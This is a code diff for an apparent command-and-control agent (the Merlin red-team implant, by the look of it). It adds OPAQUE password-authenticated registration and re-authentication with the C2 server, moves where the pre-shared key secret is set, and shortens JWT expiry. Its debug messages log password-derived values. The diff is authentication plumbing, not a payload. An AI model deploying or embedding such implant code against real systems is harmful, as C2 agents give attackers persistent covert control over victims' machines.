@@ -48,6 +48,7 @@ import (
 	"github.com/lucas-clemente/quic-go"
 	"github.com/lucas-clemente/quic-go/h2quic"
 	"github.com/satori/go.uuid"
+	"golang.org/x/crypto/pbkdf2"
 	"golang.org/x/net/http2"
 	"gopkg.in/square/go-jose.v2"
 	"gopkg.in/square/go-jose.v2/jwt"
@@ -95,6 +96,8 @@ type Agent struct {
 	JWT           string          // Authentication JSON Web Token
 	URL           string          // The C2 server URL
 	Host          string          // HTTP Host header, typically used with Domain Fronting
+	pwdU          []byte          // SHA256 hash from 5000 iterations of PBKDF2 with a 30 character random string input
+	psk           string          // Pre-Shared Key
 }
 
 // New creates a new agent struct with specific values and returns the object
@@ -160,9 +163,13 @@ func New(protocol string, url string, host string, psk string, proxy string, ver
 
 	a.Client = client
 
+	// Generate a random password and run it through 5000 iterations of PBKDF2; Used with OPAQUE
+	x := core.RandStringBytesMaskImprSrc(30)
+	a.pwdU = pbkdf2.Key([]byte(x), a.ID.Bytes(), 5000, 32, sha256.New)
+
 	// Set encryption secret to pre-authentication pre-shared key
-	k := sha256.Sum256([]byte(psk))
-	a.secret = k[:]
+	a.psk = psk
+
 	// Generate RSA key pair
 	privateKey, rsaErr := rsa.GenerateKey(cryptorand.Reader, 4096)
 	if rsaErr != nil {
@@ -170,13 +177,6 @@ func New(protocol string, url string, host string, psk string, proxy string, ver
 	}
 
 	a.RSAKeys = privateKey
-
-	// Create JWT using pre-authentication pre-shared key; updated by server after authentication
-	agentJWT, errJWT := a.getJWT()
-	if errJWT != nil {
-		return a, fmt.Errorf("there was an erreor getting the initial JWT:\r\n%s", errJWT)
-	}
-	a.JWT = agentJWT
 
 	if a.Verbose {
 		message("info", "Host Information:")
@@ -243,6 +243,17 @@ func (a *Agent) initialCheckIn(client *http.Client) bool {
 
 	if a.Debug {
 		message("debug", "Entering initialCheckIn function")
+	}
+
+	// Register
+	errOPAQUEReg := a.opaqueRegister()
+	if errOPAQUEReg != nil {
+		a.FailedCheckin++
+		if a.Verbose {
+			message("warn", errOPAQUEReg.Error())
+			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
+		}
+		return false
 	}
 
 	// Authenticate
@@ -819,6 +830,17 @@ func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
 		p := m.Payload.(messages.KeyExchange)
 		a.PublicKey = p.PublicKey
 		return returnMessage, nil
+	case "ReAuthenticate":
+		if a.Verbose {
+			message("note", "Re-authenticating with OPAQUE protocol")
+		}
+
+		errAuth := a.opaqueAuthenticate()
+		if errAuth != nil {
+			return returnMessage, fmt.Errorf("there was an error during OPAQUE Re-Authentication:\r\n%s", errAuth)
+		}
+		m.Type = ""
+		return returnMessage, nil
 	default:
 		return returnMessage, fmt.Errorf("%s is not a valid message type", m.Type)
 	}
@@ -976,8 +998,121 @@ func (a *Agent) list(path string) (string, error) {
 	return details, nil
 }
 
+//opaqueRegister is used to perform the OPAQUE Password Authenticated Key Exchange (PAKE) protocol Registration
+func (a *Agent) opaqueRegister() error {
+
+	if a.Verbose {
+		message("note", "Starting OPAQUE Registration")
+	}
+
+	// Build OPAQUE User Registration Initialization
+	userReg := gopaque.NewUserRegister(gopaque.CryptoDefault, a.ID.Bytes(), nil)
+	userRegInit := userReg.Init(a.pwdU)
+
+	if a.Debug {
+		message("debug", fmt.Sprintf("OPAQUE UserID: %v", userRegInit.UserID))
+		message("debug", fmt.Sprintf("OPAQUE Alpha: %v", userRegInit.Alpha))
+		message("debug", fmt.Sprintf("OPAQUE PwdU: %s", a.pwdU))
+	}
+
+	userRegInitBytes, errUserRegInitBytes := userRegInit.ToBytes()
+	if errUserRegInitBytes != nil {
+		return fmt.Errorf("there was an error marshalling the OPAQUE user registration initialization message to bytes:\r\n%s", errUserRegInitBytes.Error())
+	}
+
+	// Message to be sent to the server
+	regInitBase := messages.Base{
+		Version: 1.0,
+		ID:      a.ID,
+		Type:    "RegInit",
+		Payload: userRegInitBytes,
+		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
+	}
+
+	// Set secret for JWT and JWE encryption key from PSK
+	k := sha256.Sum256([]byte(a.psk))
+	a.secret = k[:]
+
+	// Create JWT using pre-authentication pre-shared key; updated by server after authentication
+	agentJWT, errJWT := a.getJWT()
+	if errJWT != nil {
+		return fmt.Errorf("there was an erreor getting the initial JWT during OPAQUE registration:\r\n%s", errJWT)
+	}
+	a.JWT = agentJWT
+
+	regInitResp, errRegInitResp := a.sendMessage("POST", regInitBase)
+
+	if errRegInitResp != nil {
+		return fmt.Errorf("there was an error sending the agent OPAQUE user registration initialization message:\r\n%s", errRegInitResp.Error())
+	}
+
+	if regInitResp.Type != "RegInit" {
+		return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user registration initialization", regInitResp.Type)
+	}
+
+	var serverRegInit gopaque.ServerRegisterInit
+
+	errServerRegInit := serverRegInit.FromBytes(gopaque.CryptoDefault, regInitResp.Payload.([]byte))
+	if errServerRegInit != nil {
+		return fmt.Errorf("there was an error unmarshalling the OPAQUE server register initialization message from bytes:\r\n%s", errServerRegInit.Error())
+	}
+
+	if a.Verbose {
+		message("note", "Received OPAQUE server registration initialization message")
+	}
+
+	if a.Debug {
+		message("debug", fmt.Sprintf("OPAQUE Beta: %v", serverRegInit.Beta))
+		message("debug", fmt.Sprintf("OPAQUE V: %v", serverRegInit.V))
+		message("debug", fmt.Sprintf("OPAQUE PubS: %s", serverRegInit.ServerPublicKey))
+	}
+
+	// TODO extend gopaque to run RwdU through n iterations of PBKDF2
+	userRegComplete := userReg.Complete(&serverRegInit)
+
+	userRegCompleteBytes, errUserRegCompleteBytes := userRegComplete.ToBytes()
+	if errUserRegCompleteBytes != nil {
+		return fmt.Errorf("there was an error marshalling the OPAQUE user registration complete message to bytes:\r\n%s", errUserRegCompleteBytes.Error())
+	}
+
+	if a.Debug {
+		message("debug", fmt.Sprintf("OPAQUE EnvU: %v", userRegComplete.EnvU))
+		message("debug", fmt.Sprintf("OPAQUE PubU: %v", userRegComplete.UserPublicKey))
+	}
+
+	// message to be sent to the server
+	regCompleteBase := messages.Base{
+		Version: 1.0,
+		ID:      a.ID,
+		Type:    "RegComplete",
+		Payload: userRegCompleteBytes,
+		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
+	}
+
+	regCompleteResp, errRegCompleteResp := a.sendMessage("POST", regCompleteBase)
+
+	if errRegCompleteResp != nil {
+		return fmt.Errorf("there was an error sending the agent OPAQUE user registration complete message:\r\n%s", errRegCompleteResp.Error())
+	}
+
+	if regCompleteResp.Type != "RegComplete" {
+		return fmt.Errorf("invalid message type %s in resopnse to OPAQUE user registration complete", regCompleteResp.Type)
+	}
+
+	if a.Verbose {
+		message("note", "OPAQUE registration complete")
+	}
+
+	return nil
+}
+
 // opaqueAuthenticate is used to authenticate an agent leveraging the OPAQUE Password Authenticated Key Exchange (PAKE) protocol
 func (a *Agent) opaqueAuthenticate() error {
+
+	if a.Verbose {
+		message("note", "Starting OPAQUE Authentication")
+	}
+
 	// 1 - Create a NewUserAuth with an embedded key exchange
 	userKex := gopaque.NewKeyExchangeSigma(gopaque.CryptoDefault)
 	userAuth := gopaque.NewUserAuth(gopaque.CryptoDefault, a.ID.Bytes(), userKex)
@@ -1001,6 +1136,17 @@ func (a *Agent) opaqueAuthenticate() error {
 		Payload: userAuthInitBytes,
 		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
 	}
+
+	// Set secret for JWT and JWE encryption key from PSK
+	k := sha256.Sum256([]byte(a.psk))
+	a.secret = k[:]
+
+	// Create JWT using pre-authentication pre-shared key; updated by server after authentication
+	agentJWT, errJWT := a.getJWT()
+	if errJWT != nil {
+		return fmt.Errorf("there was an erreor getting the initial JWT during OPAQUE authentication:\r\n%s", errJWT)
+	}
+	a.JWT = agentJWT
 
 	authInitResp, errAuthInitResp := a.sendMessage("POST", authInitBase)
 
@@ -1049,6 +1195,10 @@ func (a *Agent) opaqueAuthenticate() error {
 
 	if errAuthCompleteResp != nil {
 		return fmt.Errorf("there was an error sending the agent OPAQUE authentication completion message:\r\n%s", errAuthCompleteResp.Error())
+	}
+
+	if authCompleteResp.Token != "" {
+		a.JWT = authCompleteResp.Token
 	}
 
 	switch authCompleteResp.Type {
@@ -1127,6 +1277,7 @@ func (a *Agent) getJWT() (string, error) {
 
 	// Build JWT claims
 	cl := jwt.Claims{
+		Expiry:   jwt.NewNumericDate(time.Now().UTC().Add(time.Second * 10)),
 		IssuedAt: jwt.NewNumericDate(time.Now().UTC()),
 		ID:       a.ID.String(),
 	}
